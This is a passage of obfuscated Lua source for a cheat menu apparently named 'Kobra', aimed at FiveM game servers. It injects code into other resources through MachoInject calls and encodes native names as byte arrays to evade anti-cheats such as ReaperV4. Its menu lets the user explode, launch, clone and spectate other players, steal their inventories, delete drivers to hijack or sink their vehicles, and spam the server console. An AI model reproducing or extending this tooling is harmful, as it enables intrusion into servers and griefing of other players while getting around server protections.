                                        pedModel = "a_c_sharktiger"
                                    elseif selected == "Hammerhead Shark" then
                                        pedModel = "a_c_sharkhammer"
                                    elseif selected == "Chickenhawk" then
                                        pedModel = "a_c_chickenhawk"
                                    elseif selected == "Cormorant" then
                                        pedModel = "a_c_cormorant"
                                    else
                                        pedModel = nil
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid animal selected: " .. tostring(selected))
                                    end
                                ]]):format(v392));end}}}}},{icon="",label="Server",type="subMenu",categories={{label="List",tabs={{type="button",label="Select Everyone"},{type="button",label="Un-Select Everyone"},{type="button",label="Clear Selection"},{type="divider",label="Nearby Players"}}},{label="Safe",tabs={{type="button",label="Teleport to Player",desc="This will teleport you to the selected player",onSelect=function() local v393=276 -(259 + 17) ;local v394;while true do if (v393==(1 + 0)) then if v394 then local v841=GetPlayerFromServerId(v394);if ((v841== -(1 + 0)) or  not DoesEntityExist(GetPlayerPed(v841))) then local v1031=0 -0 ;while true do if (v1031==(592 -(396 + 195))) then v12:UpdateListMenu();return;end if (v1031==(0 -0)) then v275:Notify("error","Kobra","There was an error while trying to teleport to that player! (ERR:1)",4761 -(440 + 1321) );v27[v394]=nil;v1031=1;end end end local v842=GetPlayerPed(v841);local v843=GetEntityCoords(v842);local v844=GetEntityHeading(v842);SetEntityCoords(PlayerPedId(),v843.x,v843.y,v843.z,false,false,false,false);SetEntityHeading(PlayerPedId(),v844);v275:Notify("success","Kobra",("You have teleported to %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v394)),v394),3000);else v275:Notify("error","Kobra","You must select a player to do this!",4829 -(1059 + 770) );end break;end if (v393==0) then v394=nil;for v778,v779 in pairs(v27) do if v779 then v394=v778;break;end end v393=4 -3 ;end end end},{type="checkbox",label="Spectate Player",checked=false,desc="This will attempt to Spectate the player",onSelect=function(v395) local v396=0 + 0 ;local v397;while true do if ((1347 -(641 + 706))==v396) then v397=nil;for v780,v781 in pairs(v27) do if v781 then v397=v780;break;end end v396=1;end if (v396==1) then v275:HandleSpectateToggle(v397,v395);break;end end end},{type="button",label="Copy Appearance",desc="Copy Players Clothing",onSelect=function() local v398={};for v543,v544 in pairs(v27) do if v544 then v398[ #v398 + (441 -(249 + 191)) ]=v543;end end if ( #v398==0) then v275:Notify("error","Kobra","You must select a player to do this!",13069 -10069 );return;end local v399=v398[1];local v400=GetResourceState("ReaperV4")=="started" ;if v400 then MachoInjectThread(0 + 0 ,"any","",string.format([[
                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end
                                        local function findClientIdByServerId(sid)
                                            local players = _g(_b("GetActivePlayers"))()
                                            for _, pid in ipairs(players) do
                                                if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                    return pid
                                                end
                                            end
                                            return -1
                                        end
                                        
                                        local function CopyClothing(targetSid)
                                            local clientId = findClientIdByServerId(targetSid)
                                            if clientId == -1 then
                                                print("CLIENT ID NOT FOUND!")
                                                return
                                            end
                                            
                                            local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                            local myPed = _g(_b("PlayerPedId"))()
                                            
                                            if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                                print("COPYING CLOTHING...")
                                                
                                                -- COPY EVERYTHING - NO CLONING!
                                                _g(_b("SetPedComponentVariation"))(myPed, 1, _g(_b("GetPedDrawableVariation"))(targetPed, 1), _g(_b("GetPedTextureVariation"))(targetPed, 1), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 3, _g(_b("GetPedDrawableVariation"))(targetPed, 3), _g(_b("GetPedTextureVariation"))(targetPed, 3), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 4, _g(_b("GetPedDrawableVariation"))(targetPed, 4), _g(_b("GetPedTextureVariation"))(targetPed, 4), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 6, _g(_b("GetPedDrawableVariation"))(targetPed, 6), _g(_b("GetPedTextureVariation"))(targetPed, 6), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 8, _g(_b("GetPedDrawableVariation"))(targetPed, 8), _g(_b("GetPedTextureVariation"))(targetPed, 8), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)
                                                
                                                -- Copy accessories
                                                _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)
                                                
                                                print("CLOTHING COPIED!")
                                            else
                                                print("PED NOT FOUND!")
                                            end
                                        end
                                        
                                        CopyClothing(%d)
                                    ]],v399));else local v612=0;local v613;local v614;local v615;local v616;local v617;while true do if (v612==(3 -2)) then v615=nil;function v615(v940) local v941=427 -(183 + 244) ;local v942;local v943;while true do if (v941==(1 + 0)) then return v943;end if (v941==(730 -(434 + 296))) then v942=v614(v940);v943=_G[v942];v941=2 -1 ;end end end v616=nil;function v616(v944) local v945=512 -(169 + 343) ;local v946;while true do if (v945==(0 + 0)) then v946=v615(v613("GetActivePlayers"))();for v1170,v1171 in ipairs(v946) do if (v615(v613("GetPlayerServerId"))(v1171)==v944) then return v1171;end end v945=1;end if (v945==(1 -0)) then return  -(2 -1);end end end v612=2;end if ((2 + 0)==v612) then v617=nil;function v617(v947) local v948=0;local v949;local v950;local v951;while true do if (v948==(0 -0)) then v949=v616(v947);if (v949== -(1124 -(651 + 472))) then print("^1[ERROR] Client ID not found for Server ID: "   .. v947   .. "^0" );return;end v948=1 + 0 ;end if (v948==(1 + 0)) then v950=v615(v613("GetPlayerPed"))(v949);v951=v615(v613("PlayerPedId"))();v948=2 -0 ;end if (v948==2) then if (v615(v613("DoesEntityExist"))(v950) and v615(v613("DoesEntityExist"))(v951)) then print("^2[Kobra] Copying clothing from Server ID: "   .. v947   .. "^0" );v615(v613("SetPedComponentVariation"))(v951,484 -(397 + 86) ,v615(v613("GetPedDrawableVariation"))(v950,877 -(423 + 453) ),v615(v613("GetPedTextureVariation"))(v950,1 + 0 ),0);v615(v613("SetPedComponentVariation"))(v951,1 + 2 ,v615(v613("GetPedDrawableVariation"))(v950,3 + 0 ),v615(v613("GetPedTextureVariation"))(v950,3 + 0 ),0 + 0 );v615(v613("SetPedComponentVariation"))(v951,4,v615(v613("GetPedDrawableVariation"))(v950,1194 -(50 + 1140) ),v615(v613("GetPedTextureVariation"))(v950,4),0 + 0 );v615(v613("SetPedComponentVariation"))(v951,4 + 2 ,v615(v613("GetPedDrawableVariation"))(v950,1 + 5 ),v615(v613("GetPedTextureVariation"))(v950,8 -2 ),0);v615(v613("SetPedComponentVariation"))(v951,6 + 2 ,v615(v613("GetPedDrawableVariation"))(v950,8),v615(v613("GetPedTextureVariation"))(v950,604 -(157 + 439) ),0);v615(v613("SetPedComponentVariation"))(v951,18 -7 ,v615(v613("GetPedDrawableVariation"))(v950,36 -25 ),v615(v613("GetPedTextureVariation"))(v950,32 -21 ),918 -(782 + 136) );v615(v613("SetPedPropIndex"))(v951,855 -(112 + 743) ,v615(v613("GetPedPropIndex"))(v950,1171 -(1026 + 145) ),v615(v613("GetPedPropTextureIndex"))(v950,0),true);v615(v613("SetPedPropIndex"))(v951,1 + 0 ,v615(v613("GetPedPropIndex"))(v950,719 -(493 + 225) ),v615(v613("GetPedPropTextureIndex"))(v950,1),true);v615(v613("SetPedPropIndex"))(v951,2,v615(v613("GetPedPropIndex"))(v950,2),v615(v613("GetPedPropTextureIndex"))(v950,7 -5 ),true);print("^2[Kobra] Clothing copied successfully!^0");else print("^3[WARNING] Target or local ped does not exist.^0");end break;end end end v617(v399);break;end if (v612==0) then v613=nil;function v613(v952) local v953=0;local v954;while true do if (v953==(1 + 0)) then return v954;end if (v953==(0 -0)) then v954={};for v1172=1 + 0 , #v952 do v954[v1172]=string.byte(v952,v1172);end v953=2 -1 ;end end end v614=nil;function v614(v955) local v956="";for v1032=1 + 0 , #v955 do v956=v956   .. string.char(v955[v1032]) ;end return v956;end v612=1;end end end v275:Notify("success","Kobra","Copied clothing!",8353 -3353 );end},{type="button",label="Launch Player",desc="This will attempt to launch the player into the sky",onSelect=function() local v401=0;local v402;while true do if ((1690 -(1201 + 488))==v401) then if ( #v402==0) then v275:Notify("error","Kobra","You must select a player to do this!",1860 + 1140 );return;end v275:HandleLaunchPlayer(v402);v401=2 -0 ;end if (v401==(0 -0)) then v402={};for v782,v783 in pairs(v27) do if v783 then v402[ #v402 + (586 -(352 + 233)) ]=v782;end end v401=1;end if (v401==(4 -2)) then v275:Notify("success","Kobra","Attempting to TEST",2720 + 2280 );break;end end end}}},{label="Risky",tabs={{type="button",label="Explode Player",desc="This will attempt to explode the player using a vehicle",onSelect=function() local v403={};for v545,v546 in pairs(v27) do if v546 then v403[ #v403 + (575 -(489 + 85)) ]=v545;end end if ( #v403==(1501 -(277 + 1224))) then v275:Notify("error","Kobra","You must select a player to do this!",3000);return;end for v547,v548 in ipairs(v403) do local v549=v548;local v550=GetPlayerFromServerId(v548);if ((v550== -(1494 -(663 + 830))) or  not DoesEntityExist(GetPlayerPed(v550))) then local v713=0;while true do if (v713==(0 + 0)) then v275:Notify("error","Kobra","You must select a player to do this!",3000);v27[v548]=nil;v713=2 -1 ;end if (v713==(876 -(461 + 414))) then return;end end else local v714=[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                local func = _G[decode(n)]
                                                if not func then
                                                    return nil
                                                end
                                                return func
                                            end
                                            local function wait(n)
                                                local waitFunc = g({87,97,105,116}) -- "Wait"
                                                if not waitFunc then
                                                    return
                                                end
                                                return waitFunc(n)
                                            end

                                            local vehicleName = decode({109,97,110,99,104,101,122}) -- "manchez"
                                            local requestModel = g({82,101,113,117,101,115,116,77,111,100,101,108})
                                            if not requestModel then return end
                                            requestModel(vehicleName)

                                            local hasModelLoaded = g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})
                                            if hasModelLoaded then
                                                local attempts = 0
                                                while not hasModelLoaded(vehicleName) and attempts < 20 do
                                                    wait(500)
                                                    attempts = attempts + 1
                                                end
                                                if attempts >= 20 then
                                                    return
                                                end
                                            end

                                            local getPlayerFromServerId = g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})
                                            if not getPlayerFromServerId then return end
                                            local targetPlayer = getPlayerFromServerId(]]   .. tostring(v549)   .. [[)
                                            if targetPlayer == -1 then
                                                return
                                            end

                                            local getPlayerPed = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                            if not getPlayerPed then return end
                                            local targetPed = getPlayerPed(targetPlayer)
                                            if not targetPed or targetPed == 0 then
                                                return
                                            end

                                            local localPlayerPed = getPlayerPed(-1) -- Get local player ped
                                            if not localPlayerPed or localPlayerPed == 0 then
                                                return
                                            end

                                            local getEntityCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})
                                            local getEntityHeading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})
                                            local setEntityHealth = g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})
                                            if not getEntityCoords or not getEntityHeading then return end
                                            local targetPos = getEntityCoords(targetPed)
                                            local heading = getEntityHeading(targetPed)

                                            local giveWeapon = g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})
                                            local setCurrentWeapon = g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110})
                                            local getHashKey = g({71,101,116,72,97,115,104,75,101,121})
                                            local shootBullet = g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})
                                            local removeWeapon = g({82,101,109,111,118,101,87,101,97,112,111,110,70,114,111,109,80,101,100})
                                            local setMissionEntity = g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})

                                            local pistolHash = getHashKey(decode({87,69,65,80,79,78,95,65,80,80,73,83,84,79,76}))
                                            giveWeapon(localPlayerPed, pistolHash, 200, false, true)
                                            setCurrentWeapon(localPlayerPed, pistolHash, true)

                                            wait(1000) -- Wait 3 seconds before spawning vehicle

                                            local createVehicle = g({67,114,101,97,116,101,86,101,104,105,99,108,101})
                                            if not createVehicle then return end
                                            local vehicleSpawnPos = {x = targetPos.x + 2.0, y = targetPos.y, z = targetPos.z + 0.2} -- Offset 5 units, slight Z lift
                                            local vehicle = createVehicle(vehicleName, vehicleSpawnPos.x, vehicleSpawnPos.y, vehicleSpawnPos.z, heading, true, true)
                                            if not vehicle or vehicle == 0 then
                                                return
                                            end

                                            if setMissionEntity then
                                                setMissionEntity(vehicle, true, true)
                                            end
                                            if setEntityHealth then
                                                setEntityHealth(vehicle, 10) -- Set low health for easy explosion
                                            end

                                            for i = 1, 60 do
                                                local vehicleCoords = getEntityCoords(vehicle) -- Get updated vehicle coords each time
                                                shootBullet(
                                                    targetPos.x, targetPos.y, targetPos.z + 1.0, -- Start near target ped
                                                    vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 0.3, -- Aim at vehicle center (tighter offset)
                                                    2000.0, true, pistolHash, localPlayerPed, true, false, 2000.0 -- Higher speed for accuracy
                                                )
                                                wait(1) -- Slightly slower shooting for stability
                                            end

                                            removeWeapon(localPlayerPed, pistolHash)
                                        ]] ;MachoInjectResourceRaw("any",v714,v549);v275:Notify("success","Kobra","Attempting to Explode Player",839 + 4161 );end end v12:UpdateListMenu();end},{type="button",label="Steal Inventory",desc="This will attempt to open the selected players inventory",onSelect=function() local v404={};for v551,v552 in pairs(v27) do if v552 then v404[ #v404 + 1 + 0 ]=v551;end end if ( #v404==0) then local v618=0;while true do if ((0 + 0)==v618) then v275:Notify("error","Kobra","You must select a player to do this!",2958 + 42 );return;end end end v275:HandleTakeInventory(v404);v275:Notify("success","Kobra","Attempting to steal inventory",5250 -(172 + 78) );end},{type="divider",label="Ped Options"},{type="button",label="Clone Player",onSelect=function() local v405={};for v553,v554 in pairs(v27) do if v554 then v405[ #v405 + 1 ]=v553;end end if ( #v405==(0 + 0)) then local v619=0 -0 ;while true do if (v619==0) then v275:Notify("error","Kobra","You must select a player to do this!",819 + 2181 );return;end end end v275:HandleClonePlayer(v405);v275:Notify("success","Kobra","Cloned Player",1671 + 3329 );end},{type="button",label="Attack Clone Player",onSelect=function() local v406={};for v555,v556 in pairs(v27) do if v556 then v406[ #v406 + (1 -0) ]=v555;end end if ( #v406==(0 + 0)) then v275:Notify("error","Kobra","You must select a player to do this!",1659 + 1341 );return;end v275:HandleAttackClonePlayer(v406);v275:Notify("success","Kobra","Cloned Player",5000);end},{type="divider",label="Vehicle Options"},{type="scrollable",label="Attach Vehicle",scrollType="onEnter",value=2 -1 ,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","kuruma","zentorno","entityxf","carbonizzare","elegy","massacro","vagner","nightshark","banshee","feltzer2","ruston","bullet","elegy2"},onSelect=function(v407) local v408=1479 -(888 + 591) ;local v409;while true do if (v408==(0 -0)) then v409={};for v784,v785 in pairs(v27) do if v785 then v409[ #v409 + 1 + 0 ]=v784;end end v408=3 -2 ;end if (v408==1) then if ( #v409==(0 + 0)) then local v845=0 + 0 ;while true do if (v845==(0 + 0)) then v275:Notify("error","Kobra","You must select a player to do this!",3000);return;end end end v12:AttachSelectedVehicle(v409,v407);v408=3 -1 ;end if (v408==(3 -1)) then v275:Notify("success","Kobra","Vehicle Attached to "   ..  #v409   .. " Player(s)" ,6678 -(136 + 1542) );break;end end end},{type="divider",label="Object Options"},{type="scrollable",label="Vehicle Object",scrollType="onEnter",value=1,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","zentorno","tampa","nightshark","kuruma","buffalo","massacro","ferrari","comet2","issi2","vindicator","baller","baller2"},onSelect=function(v410) local v411={};for v557,v558 in pairs(v27) do if v558 then v411[ #v411 + 1 ]=v557;end end if ( #v411==(0 -0)) then local v620=0;while true do if (v620==0) then v275:Notify("error","Kobra","You must select at least one player!",3000);return;end end end v12.GetSelectedObjectModel=function(v559) return v410;end;v12:SpawnSelectedObject(v411);end},{type="scrollable",label="Attach Prop",scrollType="onEnter",value=1,values={"prop_barrel_02a","prop_cone_float_1","prop_chair_01a","prop_boombox_01","prop_tool_broom","prop_golf_ball","prop_laptop_01a","prop_trafficcone_01a","prop_pizza_box_01","prop_mb_cargo_01a","prop_ld_crate_01a","prop_ld_fueldoor","prop_ld_greenscreen_01","prop_ld_shovel","prop_snow_bottle","prop_snow_locker_01","prop_dummy_01","prop_dummy_02"},onSelect=function(v413) local v414=0 + 0 ;local v415;while true do if (v414==(1 + 1)) then v12:SpawnSelectedObject(v415);v275:Notify("success","Kobra","Spawned object '"   .. tostring(v413)   .. "' for "   ..  #v415   .. " player(s)." ,19480 -14480 );break;end if (v414==(158 -(8 + 149))) then if ( #v415==(1320 -(1199 + 121))) then local v846=0 -0 ;while true do if (v846==0) then v275:Notify("error","Kobra","You must select at least one player!",6773 -3773 );return;end end end v12.GetSelectedObjectModel=function(v786) return v413;end;v414=1 + 1 ;end if (v414==0) then v415={};for v787,v788 in pairs(v27) do if v788 then v415[ #v415 + (3 -2) ]=v787;end end v414=2 -1 ;end end end},{type="scrollable",label="Attach Furniture",scrollType="onEnter",value=1,values={"prop_table_01","prop_table_02","prop_table_03","prop_chair_02","prop_chair_03","prop_chair_04a","prop_sofa_01","prop_sofa_02","prop_sofa_03","prop_bed_01","prop_bed_02","prop_lamp_01","prop_lamp_02","prop_lamp_03","prop_couch_01","prop_couch_02","prop_tv_01","prop_tv_02","prop_tv_03","prop_computer_01","prop_computer_02","prop_monitor_01","prop_monitor_02"},onSelect=function(v416) local v417=1033 -(912 + 121) ;local v418;while true do if (v417==(0 + 0)) then v418={};for v789,v790 in pairs(v27) do if v790 then v418[ #v418 + (1290 -(1140 + 149)) ]=v789;end end v417=1 + 0 ;end if (2==v417) then v12:SpawnSelectedObject(v418);break;end if (v417==(1 -0)) then if ( #v418==(0 + 0)) then local v847=0 -0 ;while true do if (v847==(0 -0)) then v275:Notify("error","Kobra","You must select at least one player!",518 + 2482 );return;end end end v12.GetSelectedObjectModel=function(v791) return v416;end;v417=6 -4 ;end end end},{type="scrollable",label="Attach Misc",scrollType="onEnter",value=1,values={"prop_beer_bottle","prop_soda_cup","prop_papercup_01","prop_cup_coffee_01","prop_champ_flute","prop_cs_burger_01","prop_cs_burger_02","prop_cs_hotdog_01","prop_cs_pizza_01","prop_cs_sandwich_01","prop_cs_juice_01"},onSelect=function(v419) local v420={};for v560,v561 in pairs(v27) do if v561 then v420[ #v420 + (1403 -(331 + 1071)) ]=v560;end end if ( #v420==0) then v275:Notify("error","Kobra","You must select at least one player!",3743 -(588 + 155) );return;end v12.GetSelectedObjectModel=function(v562) return v419;end;v12:SpawnSelectedObject(v420);v275:Notify("success","Kobra","Spawned object '"   .. tostring(v419)   .. "' for "   ..  #v420   .. " player(s)." ,6282 -(546 + 736) );end}}},{label="Vehicle",tabs={{type="button",label="Kick From Vehicle",onSelect=function() local v422=0 + 0 ;local v423;while true do if (v422==(0 -0)) then v423=nil;for v792,v793 in pairs(v27) do if v793 then v423=v792;break;end end v422=1767 -(1536 + 230) ;end if (v422==(492 -(128 + 363))) then if v423 then local v848=0;local v849;while true do if (v848==(1 + 1)) then v27[v423]=true;v275:UpdateListMenu();break;end if (v848==(0 -0)) then v849=GetPlayerFromServerId(v423);if (v849== -(1 + 0)) then v275:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:1)",4970 -1970 );v27[v423]=nil;v12:UpdateListMenu();return;end v848=2 -1 ;end if (v848==(2 -1)) then if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v849))) then v275:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",2059 + 941 );return;end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v1211=1010 -(615 + 394) ,2 + 0  do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function KickFromVehicleNewestV8(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        TaskLeaveVehicle(player, vehicle, 16)
                                                        Wait(450)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v849))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    KickFromVehicleNewestV8(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v848=2;end end else v275:Notify("error","Kobra","You must select a player to do this!",2860 + 140 );end break;end end end},{type="button",label="Teleport to Ocean",onSelect=function() local v424=0 -0 ;local v425;while true do if (v424==(651 -(59 + 592))) then v425=nil;for v794,v795 in pairs(v27) do if v795 then v425=v794;break;end end v424=1;end if (v424==(2 -1)) then if v425 then local v850=0 -0 ;local v851;while true do if (v850==(1 + 0)) then if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v851))) then v275:Notify("error","Kobra","There was an error while trying to tp the vehicle to the ocean! (ERR:2)",3171 -(70 + 101) );return;end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v1212=2 -1 ,2 + 0  do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function TeleportVehicleToOcean(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        SetEntityCoords(vehicle, 0.0, 0.0, 0.0, false, false, false, false)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v851))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    TeleportVehicleToOcean(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v850=2;end if (v850==2) then v27[v425]=true;v275:UpdateListMenu();break;end if (v850==(0 -0)) then v851=GetPlayerFromServerId(v425);if (v851== -1) then local v1175=241 -(123 + 118) ;while true do if (v1175==(0 + 0)) then v275:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:1)",38 + 2962 );v27[v425]=nil;v1175=1400 -(653 + 746) ;end if (v1175==(1 -0)) then v12:UpdateListMenu();return;end end end v850=1 -0 ;end end else v275:Notify("error","Kobra","You must select a player to do this!",3000);end break;end end end}}},{label="Triggers",tabs={{type="checkbox",label="Server Console Spam",checked=false,onSelect=function(v426) if v426 then print("Console Spam Started...");v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    if not _G.KobraServerConsoleSpamInitialized then
